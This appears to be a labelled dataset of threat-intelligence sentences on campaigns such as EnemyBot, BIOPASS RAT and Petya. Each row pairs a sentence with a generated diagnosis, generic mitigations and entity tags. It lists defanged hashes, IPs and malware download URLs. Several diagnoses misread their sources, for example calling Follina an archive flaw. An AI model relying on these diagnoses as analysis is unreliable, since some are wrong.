3451,"k23605346: big-ip icontrol rest vulnerability cve-2022-1388 enemybot attempts to exploit cve-2022-1388 30f7e1998d162dfad69d6d8abb763ae4033bbd4a015d170b1ad3e20d39cd4e20 da647646cd36a3acb716b4266e9032f9c1caf555b7667e1dbe5bef89e7d2fdbb b39d2a1202351d3be5d9906ec47ee05c305302124dddec5538dc7b9924c6b85d ad6d44c70f83431bedf890967f2da0607c9b1f79591fb1b2697160f5b1c1a75c 1f93a6696f7bf1b2067cc503583deb4840404ebeeba89579bd303f57000baeb7 9a72aab2a3d1d6e66c185966597a52a8726ca25f5d9e2195af44f98d8b1847d5 53214f4d2d2dfd02b46f416cbdcb6f3a764820a50da4d59926f829b96cf82a6c 20.187.67[.]224 192.132.218[.]149 85.203.23[.]73 116.48.110[.]159 hxxps://transfer[.]sh/dlxo3i/1.sh hxxp://20.239.193[.]47/kele.sh hxxp://20.239.193[.]47/kele1 hxxp://20.187.86[.]47/dadda updated may 16, 2022 sign up to receive the latest news, cyber threat intelligence and research from us please enter your email address!",the diagnosis is that the entity (enemybot) is attempting to exploit the cybersecurity issue (big-ip icontrol rest vulnerability cve-2022-1388) through the use of hashes and ip addresses. the relationship between the entities is that the,1. implementing a patch for the big-ip icontrol rest vulnerability cve-2022-1388 to prevent exploitation by enemybot. 2. implementing network segmentation to limit the spread of enemybot's attack. 3. implementing intrusion detection and prevention systems to detect and block enemybot's attack attempts. 4. implementing multi-factor authentication to prevent unauthorized access to the network. 5. implementing firewall rules to block traffic from known malicious ip addresses used by enemybot. 6.,malware,hash,hash
2299,"the watering hole served an xnu privilege escalation vulnerability (cve-2021-30869) unpatched in macos catalina, which led to the installation of a previously unreported backdoor.","the software entity in this scenario has a vulnerability (cve-2021-30869) that was exploited through a watering hole attack, resulting in the installation of a backdoor. the diagnosis is a compromised system due to an unpatched vulnerability.",1. patch management: ensure that all software and systems are up-to-date with the latest security patches and updates. this will prevent attackers from exploiting known vulnerabilities. 2. network segmentation: implement network segmentation to isolate critical systems and limit the potential impact of a compromise. this will prevent attackers from moving laterally across the network. 3. intrusion detection and prevention: implement an intrusion detection and prevention system (idps) to detect and block malicious traffic. this will help to prevent attackers from gaining,vulnerability,SOFTWARE,vulnerability
537,one example is an exploit rtf that led to downloading and installing makop ransomware remotely.,the diagnosis is a successful delivery of makop ransomware through an exploit rtf attack pattern.,1. implementing a robust email security solution that can detect and block malicious attachments and links before they reach the user's inbox. 2. deploying endpoint protection software that can detect and prevent the execution of malicious files and processes. 3. conducting regular security awareness training for employees to educate them on how to identify and avoid phishing and other social engineering attacks. 4. keeping software and operating systems up-to-date with the latest security patches to prevent known vulnerabilities from being exploited. 5. implementing network,attack-pattern,malware,
13610,"in this example, adobeairflashinstaller.exe (legitimate file) sideloads xerces-c_2_1_0.dll (patched legitimate file), which then sideloads ulibs.dll (malicious file).","the diagnosis for this cybersecurity issue is file sideloading, where a legitimate file (adobeairflashinstaller.exe) sideloads a patched legitimate file (xerces-c_2_1_0.dll), which then sideloads a malicious",1. implement strict access controls and permissions on files and folders to prevent unauthorized file sideloading. 2. use digital signatures and checksums to verify the integrity of files before they are executed. 3. implement network segmentation to isolate critical systems and prevent lateral movement of malware. 4. use endpoint detection and response (edr) tools to monitor for suspicious file activity and behavior. 5. conduct regular security awareness training for employees to educate them on the risks of file sideloading and how to avoid,FILEPATH,FILEPATH,FILEPATH
14305,code snippet of register.bat uninstall.exe is a copy of the open-source hacking tool mimikatz (https://github[.]com/gentilkiwi/mimikatz).,"the entity identified in the second column is a code snippet of register.bat. the third column indicates that the register.bat file is related to the uninstall.exe file, which in turn is related to the malware identified as a copy of the mimikatz",1. implement a robust antivirus software that can detect and remove the mimikatz malware and its associated files like register.bat and uninstall.exe. 2. conduct regular vulnerability assessments and patch management to identify and fix any vulnerabilities in the system that can be exploited by attackers to install malware like mimikatz. 3. use network segmentation to isolate critical systems and prevent the spread of malware like mimikatz to other parts of the network. 4. implement multi-factor authentication to prevent unauthorized access to sensitive systems,FILEPATH,FILEPATH,malware
1852,we also observed the execution of a password recovery tool xenarmor with c:\temp\pass\start.exe.,possible diagnosis: the use of a password recovery tool (xenarmor) and the storage of recovered passwords in a file path (c:\temp\pass\start.exe) suggest a potential breach of password security. the relationship between the tool and the,"1. implement multi-factor authentication to prevent unauthorized access even if passwords are compromised. 2. use a password manager that encrypts and securely stores passwords instead of relying on a password recovery tool. 3. regularly update and patch security software to prevent vulnerabilities that could be exploited by hackers. 4. monitor network traffic for unusual activity, such as large amounts of data being sent to unknown locations. 5. conduct regular security audits to identify and address potential vulnerabilities in the system. 6. train employees on best",tools,FILEPATH,
535,we also observed that mailto (aka netwalker) tends to deliver ransomware in a highly obfuscated powershell script.,"the entity mailto (aka netwalker) is delivering ransomware through a highly obfuscated powershell script, indicating a malware attack. the relationship between the entities suggests that the attack pattern is delivering the malware, which in turn is causing the ransomware",1. implementing strong email security measures to prevent malicious emails from reaching end-users. 2. regularly updating and patching software to prevent vulnerabilities that can be exploited by malware. 3. deploying endpoint protection solutions that can detect and prevent malware infections. 4. implementing network segmentation to limit the spread of malware in case of an infection. 5. conducting regular security awareness training for employees to prevent them from falling prey to phishing attacks and other social engineering tactics used by cybercriminals.,malware,malware,attack-pattern
2633,"while several top-tier raas affiliate programs, such as babuk, darkside and revil (aka sodinokibi) disappeared from the underground in 2021, lockbit 2.0 continued to operate and gradually became one of the most active ransomware operations.","lockbit 2.0 ransomware operation is a threat actor that is actively using malware to carry out attacks. they are related to other ransomware affiliate programs such as babuk, darkside, and revil, which have disappeared from the underground","1. implement a robust cybersecurity framework that includes regular backups, firewalls, and intrusion detection systems to detect and prevent ransomware attacks. 2. conduct regular cybersecurity awareness training for employees to educate them on how to identify and report suspicious activities and emails. 3. use endpoint security solutions such as antivirus software, anti-malware software, and intrusion prevention systems to detect and prevent ransomware attacks. 4. implement a security incident response plan that outlines the steps to take in case of a ransomware attack",threat-actor,threat-actor,threat-actor
3281,the malware downloads obs studio files if the obs folder and config file are not found in the root directory.,"possible diagnosis: the cybersecurity issue is malware that downloads obs studio files. the entity affected is a software entity, specifically the obs folder and config file. the relationship between the entities is that the malware downloads the obs studio files if the obs folder and config",potential cybersecurity solutions: 1. install and regularly update reputable antivirus software to detect and remove malware from the system. 2. enable firewalls to prevent unauthorized access to the system and block suspicious traffic. 3. implement intrusion detection and prevention systems to monitor network traffic and identify potential threats. 4. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the system. 5. educate employees on safe browsing habits and the importance of not downloading or opening suspicious files or links. 6. use,malware,SOFTWARE,
1355,the cve-2021-32648 vulnerability lies within the octobercms platform prior to version 1.0.472 and results in an attacker gaining access to any account via a specially crafted account password reset request.,the diagnosis is a vulnerability in the octobercms platform prior to version 1.0.472 that allows an attacker to gain access to any account via a specially crafted account password reset request. the vulnerability is caused by a flaw in the software and has,"1. update to the latest version of octobercms platform (version 1.0.472 or later) to ensure the vulnerability has been patched. 2. implement multi-factor authentication to add an extra layer of security to user accounts. 3. regularly scan for vulnerabilities and perform security audits to identify any potential weaknesses in the system. 4. implement strict password policies, such as requiring strong passwords and frequent password changes, to minimize the risk of password-based attacks. 5. train users on how to",vulnerability,SOFTWARE,
13546,this script is likely activated by exploiting a cross-site scripting (xss) vulnerability in the said store’s administration portal.,"the entity in question is a store's administration portal. the cybersecurity issue is a cross-site scripting (xss) vulnerability which is being exploited by a malware. the malware is using an attack-pattern to target the store's administration portal. therefore, the",1. implementing a web application firewall (waf) to detect and block malicious traffic attempting to exploit the xss vulnerability. 2. regularly conducting vulnerability assessments and penetration testing to identify and address any potential security weaknesses in the administration portal. 3. implementing strict input validation and filtering to prevent malicious code injection through user inputs. 4. enforcing secure coding practices and ensuring that all code is regularly reviewed and audited for potential vulnerabilities. 5. providing regular security awareness training to all employees with access,SOFTWARE,malware,attack-pattern
2598,"apart from argentinian ecommerce provider mercado libre / mercado pago, subsequent victimology has departed south america and pivoted to focus on the high-tech sector. recent public victims have included: it should be understood that in addition there are likely any number of other victims, targeted by attacks not known in the public sphere.","the high-tech sector has been targeted by cyber attacks, with mercado libre/mercado pago being the only known victim in south america. the relationship between the entities is that the identities (mercado libre/mercado pago and the other","implementing a comprehensive cybersecurity program that includes regular security assessments, vulnerability scanning, and penetration testing to identify and address any weaknesses in the system. this should also include implementing multi-factor authentication, encryption, and access controls to protect sensitive data. regular employee training and awareness programs can also help to prevent social engineering attacks and ensure that employees are aware of the latest cybersecurity threats. additionally, establishing partnerships with trusted cybersecurity vendors can provide access to the latest threat intelligence and technology to protect against emerging threats.",location,identity,identity
357,"as heartbleed allows the attacker to scrape memory from the vulnerable device, they can retrieve significant amounts of secret information.","heartbleed vulnerability allows an attacker to launch an attack pattern that targets the vulnerable device, resulting in significant amounts of secret information being retrieved.","1. patching and updating vulnerable devices with the latest security updates and patches to prevent exploitation of the heartbleed vulnerability. 2. implementing network segmentation to isolate vulnerable devices from critical systems, reducing the potential impact of a heartbleed attack. 3. deploying intrusion detection and prevention systems (idps) to detect and block heartbleed attacks in real-time. 4. conducting regular vulnerability assessments and penetration testing to identify and remediate vulnerabilities before they can be exploited. 5. implement",attack-pattern,vulnerability,
204,"on feb. 18, both the united states and the united kingdom attributed these ddos attacks to russia’s main intelligence directorate (gru). over the past week, ukraine has continued to observe a relatively constant flow of ddos attacks targeting its government and financial institutions.",the diagnosis is that russia's main intelligence directorate (gru) is responsible for the ddos attacks targeting ukraine's government and financial institutions. this attribution was made by both the united states and the united kingdom on feb. 18. the gr,"1. strengthening network security measures: this can include implementing firewalls, intrusion detection systems, and other security tools to prevent ddos attacks from infiltrating the network. 2. conducting regular security audits: regular security audits can help identify vulnerabilities in the network and take necessary measures to address them. 3. educating employees on cybersecurity best practices: this can include training employees on how to identify phishing emails and other social engineering tactics used by attackers to gain access to the network. 4.",identity,TIME,identity
3374,silverlight_ins.exe biopass rat loader,"the entity ""silverlight_ins.exe"" is identified as malware and is related to the entity ""biopass rat loader"" through the relationship of ""indicates"". therefore, the diagnosis is that the biopass rat loader has been infected with malware","1. install and regularly update anti-malware software to detect and remove any malicious files or programs, including silverlight_ins.exe and biopass rat loader. 2. implement network segmentation to isolate infected systems and prevent the spread of malware throughout the network. 3. conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the system that may be exploited by cybercriminals. 4. educate employees on safe browsing habits, such as avoiding suspicious websites and not clicking on unknown links",malware,FILEPATH,
5063,"ghostwriter actors have quickly adopted this new technique, combining it with a previously observed technique, hosting credential phishing landing pages on compromised sites.","threat actor ""ghostwriter"" is using a combination of techniques, including hosting credential phishing landing pages on compromised sites, to carry out attack pattern activities.",1. implement multi-factor authentication (mfa) to prevent credential phishing attacks. 2. conduct regular security audits of websites to identify and address vulnerabilities. 3. use web application firewalls (wafs) to detect and block malicious traffic. 4. train employees on how to recognize and avoid phishing attacks. 5. use threat intelligence services to monitor for ghostwriter's attack patterns and proactively block them. 6. implement strict access controls to limit the impact of compromised credentials. 7. use endpoint,attack-pattern,threat-actor,
4367,trend micro™ deep discovery™ email inspector – defends users through a combination of real-time scanning and advanced analysis techniques for known and unknown attacks. indicators of compromise hashes of the malicious encrypted documents: sha256 detection name dacf7868a71440a7d7d8797caca1aa29b7780801e6f3b3bc33123f16989354b2 trojan.w97m.confucius.a 0f6bcbdf4d192f8273887f9858819dd4690397a92fb28a60bb731c873c438e07 trojan.w97m.confucius.b,"diagnosis: malware infection entity: trend micro™ deep discovery™ email inspector relationship: provides defense against known and unknown attacks, detects indicators of compromise through real-time scanning and advanced analysis techniques, identifies two malicious encrypted documents through their sha256",1. implementing anti-malware software and firewalls to prevent malware infections 2. conducting regular security audits to identify vulnerabilities and potential threats 3. educating employees on safe browsing habits and how to identify and report suspicious emails or attachments 4. utilizing trend micro™ deep discovery™ email inspector to provide advanced email security and threat detection capabilities 5. implementing endpoint protection solutions to detect and isolate infected devices 6. regularly updating software and operating systems to patch known vulnerabilities,malware,SOFTWARE,hash
14297,infection chain of maikspy windows variant figure 8.,diagnosis: maikspy windows variant malware infection targeting software entity.,1. implementing robust anti-virus software and firewalls to prevent malware infections and unauthorized access to the system. 2. conducting regular system updates and patches to ensure that all vulnerabilities are addressed. 3. enforcing strict access control policies to prevent unauthorized access to sensitive data and systems. 4. implementing intrusion detection and prevention systems to detect and prevent malware attacks. 5. conducting regular security audits and vulnerability assessments to identify and address potential security weaknesses. 6. educating employees on cybersecurity best,malware,SOFTWARE,
1266,four of the five sysget variants included a form of decoy document to trick users into believing they had opened a legitimate file rather than malware.,possible diagnosis: the entity (unspecified) is vulnerable to a malware attack that uses a decoy document as a disguise. the attack pattern involves tricking users into opening the malicious file by making it appear as a legitimate document. the malware is one,1. employee training and awareness programs to educate staff on how to identify and avoid phishing emails and malicious attachments. 2. implementing a robust email filtering system that can detect and block suspicious emails before they reach the user's inbox. 3. installing antivirus and anti-malware software on all devices to scan for and remove any malicious files. 4. regularly updating software and operating systems to patch any vulnerabilities that could be exploited by malware. 5. implementing network segmentation to isolate critical data and systems,malware,attack-pattern,
534,"for example, gandcrab uses jscript as a downloader, leveraging windows background intelligent transfer service (bits) to download the payload in the background (figure 5).","the diagnosis is that the malware gandcrab uses the tool jscript to download its payload in the background, leveraging the windows background intelligent transfer service (bits) through the ""uses"" relationship between the entities.","1. implementing strict access controls and permissions to prevent unauthorized access to the bits service and jscript files. 2. regularly updating and patching software and operating systems to prevent vulnerabilities that can be exploited by malware such as gandcrab. 3. implementing network segmentation to isolate critical systems and prevent the spread of malware across the network. 4. deploying advanced threat detection and prevention solutions, such as intrusion detection systems and behavior-based antivirus software, to detect and block malicious activity",malware,tools,
13499,"while it offers standard mailbox copies that was likely stolen with the help of credential phishing, void balaur also offers copies of mailboxes that have not been interacted with — for a higher price.","possible diagnosis: the threat actor identified in the input is likely using the attack pattern of credential phishing to steal mailbox copies. additionally, the input suggests that the threat actor may also be offering unauthorized copies of mailboxes for a higher price. this indicates a",potential cybersecurity solutions: 1. implement two-factor authentication: two-factor authentication adds an extra layer of security to protect against credential phishing attacks. this could involve using a mobile device or a physical token to verify the user's identity before granting access. 2. conduct regular security awareness training: educate employees on how to identify and avoid phishing attacks. this could involve simulated phishing exercises and training sessions that teach employees how to recognize suspicious emails and links. 3. deploy email filtering and spam protection: email filters can,threat-actor,attack-pattern,
2407,affected software and versions background on the spring framework root cause analysis for cve-2022-22965,diagnosis: vulnerability in software (spring framework) entity: affected software version relationship: the affected software version has a vulnerability (cve-2022-22965),1. regularly update the software to the latest version to ensure that any known vulnerabilities are patched. 2. implement a vulnerability scanning tool to identify any potential vulnerabilities in the software and take necessary actions to mitigate the risks. 3. conduct regular security audits to identify any security gaps in the software and implement appropriate measures to mitigate the risks. 4. use intrusion detection and prevention systems to detect and prevent any attempts to exploit the vulnerabilities in the software. 5. implement a robust access control mechanism to restrict access,vulnerability,SOFTWARE,
1831,detecting and deleting mimikatz we observed the powershell script disabling the security products by leveraging aswarpot.sys (a legitimate avast anti-rootkit driver).,"the diagnosis is an attack using the mimikatz tool to disable security products by leveraging a legitimate avast anti-rootkit driver (aswarpot.sys) through a powershell script. the attack involves the manipulation of software and file paths, and",1. implementing strict access controls and permissions to prevent unauthorized access to critical systems and sensitive data. 2. regularly updating and patching security products and software to prevent vulnerabilities that can be exploited by attackers. 3. deploying advanced threat detection and response solutions that can detect and respond to sophisticated attacks like the one described in the diagnosis. 4. conducting regular security awareness training for employees to educate them about the latest threats and how to prevent them. 5. implementing multi-factor authentication (m,tools,tools,SOFTWARE
2816,"reports quickly emerged that this attack was effective due to the presence of code exploiting a vulnerability (cve-2017-0144) in microsoft windows (code named: eternalblue) that was released as part of the equation group dump by the shadow brokers in their fifth leak on april 14, 2017.",the entity (software) was vulnerable to a known vulnerability (cve-2017-0144) which was exploited by a threat actor (related-to) who gained unauthorized access to the system. the diagnosis is a successful cyber attack due to a lack,"1. patch management: regularly applying software patches and updates can help prevent known vulnerabilities from being exploited by attackers. 2. network segmentation: segmenting the network can help limit the spread of an attack and prevent unauthorized access to sensitive systems. 3. access control: implementing strong access control measures, such as multi-factor authentication and least privilege, can help prevent unauthorized access to systems. 4. intrusion detection and prevention: deploying intrusion detection and prevention systems can help detect and block malicious activity on",SOFTWARE,TIME,vulnerability
634,"the latest version of the petya ransomware is spreading over windows smb and is reportedly using the eternalblue exploit tool, which exploits cve-2017-0144 and was originally released by the shadow brokers group in april 2017.","the diagnosis is a malware attack using the petya ransomware, which is spreading through windows smb and exploiting the cve-2017-0144 vulnerability. the attack is likely orchestrated by a threat actor group, possibly the shadow brokers, who","1. patch the vulnerability: organizations should ensure that all their systems are updated with the latest security patches, including the patch for the cve-2017-0144 vulnerability. this can help prevent the malware from exploiting the vulnerability and spreading further. 2. implement network segmentation: by segmenting the network, organizations can limit the spread of the malware to specific areas of the network, making it easier to contain and mitigate the attack. 3. deploy endpoint protection: organizations can deploy endpoint protection solutions that can",malware,malware,threat-actor
3364,.python.biopass.a 30ccfbf24b7c8cc15f85541d5ec18feb0e19e75e1e4d2bca9941e6585dad7bc7 cdaemon.txt biopass rat python script (cdaemon module) trojan,the diagnosis is a trojan malware attack using the biopass rat python script (cdaemon module) on the entity cdaemon.txt. this is indicated by the presence of the python.biopass.a malware and its hash value (30ccfb,"1. install and regularly update anti-malware software to detect and remove trojan malware attacks like python.biopass.a. 2. implement network segmentation to isolate critical systems and prevent lateral movement of malware. 3. conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses that may be exploited by attackers. 4. use multi-factor authentication to prevent unauthorized access to sensitive systems and data. 5. train employees on cybersecurity best practices, including how to identify and report suspicious emails or attachments.",malware,hash,malware
3443,we recommend that customers update their f5 big-ip deployments to one of the following versions that have patches to mitigate cve-2022-1388:,diagnosis: the tools entity is recommending that customers update their f5 big-ip deployments to mitigate the vulnerability labeled cve-2022-1388. the relationship between the tools entity and the vulnerability entity is that the tools entity has the vulnerability entity,"1. implement a vulnerability management program that regularly scans and identifies vulnerabilities in the organization's it systems and applications, and provides recommendations for remediation. 2. conduct regular security assessments and penetration testing to identify vulnerabilities in the organization's it infrastructure and applications, and develop a plan to mitigate them. 3. implement a patch management program that regularly updates and patches software and applications to address known vulnerabilities, including cve-2022-1388. 4. implement network segmentation and access controls to isolate critical systems and",tools,vulnerability,
5025,"recently observed turla domains: coldriver, a russian-based threat actor sometimes referred to as callisto, continues to use gmail accounts to send credential phishing emails to a variety of google and non-google accounts.","the diagnosis is a case of credential phishing attack by the turla threat actor, also known as callisto, using gmail accounts to target a variety of google and non-google accounts. the threat actor is targeting the identity of the victims using the","1. implementing multi-factor authentication (mfa) across all accounts to prevent unauthorized access even if the credentials are stolen. 2. conducting regular security awareness training for employees to educate them about the risks of phishing attacks and how to identify and report suspicious emails. 3. deploying advanced email security solutions that use machine learning and artificial intelligence to detect and block phishing emails before they reach the users' inboxes. 4. enforcing strict password policies, such as using strong passwords, changing them regularly",threat-actor,threat-actor,SOFTWARE
3466,the decoy document will extract the marade downloader.,"the entity (unknown) has been targeted by a malware attack through the use of the marade downloader, which was delivered through an attack pattern.","1. implement an effective anti-malware solution that can detect and prevent marade downloader attacks. 2. use intrusion detection and prevention systems to identify and block malicious traffic patterns associated with the attack. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the entity's security infrastructure. 4. implement effective email security measures such as spam filters, email authentication, and user training to prevent phishing attacks that can deliver malware. 5. implement network segmentation and access controls to limit the",malware,attack-pattern,
1654,of particular note is how these actors use a remote administration tool (rat) named netwire (part of the netwiredrc malware family).,"diagnosis: the cybersecurity issue is the use of netwire rat, which is a variant of the netwiredrc malware family. the entities involved are the malware (netwire and netwiredrc) and the actors using them. the relationship",1. implement strong antivirus and anti-malware software to detect and prevent the installation of netwire rat and other variants of netwiredrc malware. 2. conduct regular security audits to identify any vulnerabilities in the network and system that can be exploited by the actors using netwire rat and other malware. 3. educate employees on the dangers of phishing emails and social engineering tactics used by hackers to distribute netwire rat and other malware. 4. implement two-factor authentication and strong password policies to prevent,malware,malware,
2393,a timeline of earth baku’s previous campaign as apt41 and its new campaign how earth baku creates its malware tools earth baku is known for its use of self-developed tools.,"earth baku, identified as a threat actor, has been found to use self-developed malware tools in both their previous and new campaigns. the relationship between the entities suggests that the new campaign may be a duplicate or continuation of the previous one. the",1. implementing network segmentation to prevent lateral movement of the malware within the network. 2. deploying advanced threat detection and response tools that can identify and block self-developed malware. 3. conducting regular vulnerability assessments and patch management to address potential vulnerabilities that may be exploited by the malware. 4. enhancing employee training and awareness programs to educate them on the risks of opening suspicious emails or downloading attachments from unknown sources. 5. implementing access controls and monitoring to restrict access to sensitive data and,threat-actor,threat-actor,threat-actor
4874,"benabdellah, who also goes by the moniker houdini, has been actively involved in the day-to-day development and operational deployment of the credential phishing capabilities used by this group since its inception.",benabdellah is the attacker who is responsible for the development and deployment of credential phishing capabilities. he has a direct relationship with the group that is using these capabilities.,1. implement multi-factor authentication to prevent unauthorized access to user accounts. 2. conduct regular security awareness training for employees to educate them about phishing attacks and how to identify and report them. 3. deploy anti-phishing software that can detect and block phishing attempts in real-time. 4. monitor network traffic and user behavior to identify any unusual activity that may indicate a phishing attack. 5. conduct regular security audits to identify and address any vulnerabilities in the network and systems.,attack-pattern,identity,identity
4015,"earth centaur, previously known as tropic trooper, is a long-running cyberespionage threat group that has been active since 2011.",diagnosis: cyberespionage conducted by earth centaur (previously known as tropic trooper) threat group since 2011. entity: earth centaur (previously known as tropic trooper) relationship: duplicate identity of,1. implementing advanced threat detection and prevention solutions to identify and block any malicious activity by the earth centaur (previously known as tropic trooper) threat group. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the organization's security infrastructure. 3. implementing strict access controls and monitoring systems to prevent unauthorized access to sensitive data and systems. 4. educating employees on cybersecurity best practices and providing regular training to ensure they are aware of the latest threats,TIME,threat-actor,threat-actor
5022,"turla, a group tag attributes to russia fsb, continues to run campaigns against the baltics, targeting defense and cybersecurity organizations in the region.","diagnosis: turla, a threat actor group, attributed to russia fsb, is conducting cyber espionage campaigns against defense and cybersecurity organizations in the baltics. the group is targeting these entities in the region, indicating a potential threat to national security",1. implementing advanced threat detection and response mechanisms to identify and mitigate turla's attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and remediate potential security weaknesses. 3. utilizing endpoint protection solutions to prevent malware and other malicious activities. 4. implementing network segmentation and access controls to limit the spread of turla's attacks. 5. enhancing employee cybersecurity awareness training to prevent social engineering attacks. 6. collaborating with government agencies and other organizations to share,identity,threat-actor,identity
347,the pdf exploits cve-2013-2729 to download a binary which also installed cryptowall 2.0.,"the diagnosis is a malware infection caused by exploitation of a vulnerability (cve-2013-2729). the pdf file is the entity that exploits the vulnerability and downloads a binary, which in turn installs cryptowall 2.0. the relationship between",1. patch the vulnerability (cve-2013-2729) to prevent exploitation. 2. implement anti-malware software that can detect and remove cryptowall 2.0. 3. educate users on safe browsing habits and to not open suspicious pdf files or download files from untrusted sources. 4. implement network segmentation to limit the spread of the malware. 5. use intrusion detection and prevention systems to detect and block the malware from entering the network. 6,malware,vulnerability,
4821,"one recent campaign from a group tracked by cert-ua as uac-0098 delivered malicious documents with the follina exploit in password-protected archives, impersonating the state tax service of ukraine.","the diagnosis is that a threat actor (uac-0098) is using the follina exploit to deliver malicious documents impersonating the state tax service of ukraine, exploiting a vulnerability in password-protected archives.","1. patch the vulnerability: a potential solution to prevent the follina exploit is to patch the vulnerability in password-protected archives. this can be done by updating the software or using a different archiving tool that does not have the vulnerability. 2. implement email filtering: implementing email filtering solutions can help prevent the delivery of malicious documents. this can be done by using email filters that scan for malicious attachments or links, and block them from reaching the user's inbox. 3. user awareness training",identity,threat-actor,vulnerability
2030,"while there is a lot of overlap between helloxd and babuk, there are some small but crucial differences to take note of between babuk and the two different variants. helloxd version 1 is the least modified, utilizing curve25519-donna and a modified hc-128 algorithm to encrypt file data, while also containing the same crc hashing routine incorporating the string dong, possibly referencing chuong dong, who had previously analyzed and reported on the first version of babuk (figure 8).","babuk malware variant 1 utilizes curve25519-donna and a modified hc-128 algorithm to encrypt file data, and contains the same crc hashing routine as helloxd, which may reference chuong dong, who had previously analyzed and reported","1. implementing strong encryption protocols and algorithms that are resistant to babuk malware variant 1, such as aes-256. 2. conducting regular security audits and assessments to identify vulnerabilities and weaknesses in the system. 3. implementing multi-factor authentication to prevent unauthorized access to sensitive data. 4. implementing intrusion detection and prevention systems to detect and block malicious activity. 5. providing regular security awareness training to employees to prevent phishing and social engineering attacks. 6. regularly updating and patching",malware,malware,malware
1711,"in october, cryptowall 2.0 began using the tor anonymity network to serve web pages to infected users who wanted their encrypted files back.",diagnosis: cryptowall 2.0 malware infection entity: tor anonymity network relationship: the malware uses the tor anonymity network to serve web pages to infected users.,1. implementing network segmentation to isolate infected systems and prevent the spread of the malware. 2. deploying anti-malware software with advanced threat detection capabilities to detect and remove cryptowall 2.0 malware from infected systems. 3. blocking access to tor anonymity network from the organization's network to prevent communication with the malware's command-and-control servers. 4. conducting regular security awareness training for employees to prevent them from downloading and executing malicious files. 5. implementing a robust backup and,tools,TIME,malware
3448,these were found by analysis of the packet captures that triggered the f5 big-ip authentication bypass vulnerability signature.,"the diagnosis is an authentication bypass vulnerability in f5 big-ip caused by the use of certain tools, as identified through analysis of packet captures.",1. implementing multi-factor authentication (mfa) to add an extra layer of security to the authentication process and prevent unauthorized access. 2. updating the f5 big-ip software to the latest version to fix the vulnerability and patch any security holes. 3. restricting access to the f5 big-ip system to authorized personnel only and implementing strict access controls. 4. regularly monitoring and analyzing network traffic to detect any suspicious activity or attempts to exploit vulnerabilities. 5. conducting regular,vulnerability,tools,
2404,"on april 8, we updated this blog to include statistics on springshell exploitation attempts that we identified by analyzing hits on the spring core remote code execution vulnerability threat prevention signature for the palo alto networks next-generation firewall, as well as alerts triggered in cortex xdr.",the cybersecurity issue is the spring core remote code execution vulnerability. the entity involved is the palo alto networks next-generation firewall. the relationship between the entities is that the firewall was used to prevent exploitation attempts on the vulnerability and trigger alerts in cortex x,"1. patching the spring core vulnerability on all systems that use it, including the palo alto networks next-generation firewall, to prevent remote code execution attacks. 2. implementing network segmentation and access control policies to limit the exposure of vulnerable systems to potential attackers. 3. deploying intrusion prevention systems (ips) and intrusion detection systems (ids) to monitor network traffic and detect and prevent exploitation attempts on the vulnerability. 4. enabling security analytics and threat intelligence feeds in cortex x to proactively",SOFTWARE,TIME,vulnerability
13924,that the group admittedly spares companies in cis countries could be a clue to where darkside actors are residing.,"possible diagnosis: darkside actors may be based in cis countries and are using malware to target companies, while sparing those located in the same region.","1. implementing strong network security measures such as firewalls, intrusion detection and prevention systems, and antivirus software to prevent malware attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security weaknesses. 3. establishing a robust incident response plan to detect, contain, and mitigate cyber attacks. 4. implementing multi-factor authentication and access controls to limit unauthorized access to sensitive data and systems. 5. educating employees on cybersecurity best practices and providing regular training to improve their",malware,location,
3763,"cve-2022-22960 is a privilege escalation vulnerability in vmware workspace one access, identity manager and vrealize automation instances, due to improper permissions in support scripts.",the diagnosis is that the entity (software) has a vulnerability (cve-2022-22960) that is being exploited through an attack pattern (improper permissions in support scripts) which allows for privilege escalation. this vulnerability is present in vmware workspace,1. patch and update the affected software to the latest version that includes a fix for cve-2022-22960. 2. implement proper access controls and permissions for support scripts to prevent unauthorized privilege escalation. 3. utilize intrusion detection and prevention systems to detect and block attacks attempting to exploit the vulnerability. 4. conduct regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities before they can be exploited by attackers. 5. implement multi-factor authentication to prevent unauthorized access to the affected software,attack-pattern,SOFTWARE,vulnerability
2081,"most of his videos, comments, configurations and tutorials are written in russian – and when combined with knowledge gained from a few opsec mistakes – russia is also where we believe x4k originates from.","the diagnosis is that the threat actor x4k originates from russia, as indicated by their use of the russian language and opsec mistakes, and their location is confirmed to be in russia. this poses a cybersecurity threat as the actor may have access to",1. implementing geo-blocking or ip blocking to prevent traffic from russia from accessing sensitive systems or data. 2. deploying intrusion detection and prevention systems (idps) to detect and block any malicious activity from the threat actor. 3. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the organization's security posture. 4. implementing multi-factor authentication (mfa) to prevent unauthorized access to sensitive systems and data. 5. educating employees on cybersecurity best practices and,threat-actor,location,
1580,"according to eset, the initial infection vector for bad rabbit is through a fake adobe flash update that is offered up from compromised websites.","the diagnosis is that malware, specifically bad rabbit, has infected the system through a fake adobe flash update that was offered from compromised websites. the identity of the affected entity is not specified, but the software entity, adobe flash, is directly related to the","1. install and regularly update antivirus software to detect and remove malware such as bad rabbit. 2. implement a web filtering solution to block access to compromised websites that may offer fake software updates. 3. educate employees and users on the dangers of downloading software from untrusted sources and encourage them to only download software from reputable sources. 4. use a vulnerability management system to identify and patch vulnerabilities in software, such as adobe flash, that may be exploited by malware. 5. implement network segmentation to limit",malware,identity,SOFTWARE
3182,"the initial delivery mechanism of biopass rat uses of a watering hole, a compromised website in which the malicious actors inject their custom javascript code to deliver malware.","diagnosis: the cybersecurity issue is the use of a watering hole attack to deliver malware, specifically the biopass rat. the entity involved is the malware itself. the relationship between the entities is that the malware uses the watering hole attack as its initial",potential cybersecurity solutions to address the use of a watering hole attack to deliver the biopass rat malware include: 1. implementing network segmentation and access controls to limit the spread of malware within the network. this can help prevent the malware from moving laterally and infecting other systems. 2. deploying intrusion detection and prevention systems (idps) that can detect and block malicious traffic associated with the watering hole attack. this can help prevent the malware from being delivered to targeted systems. 3. conduct,attack-pattern,malware,
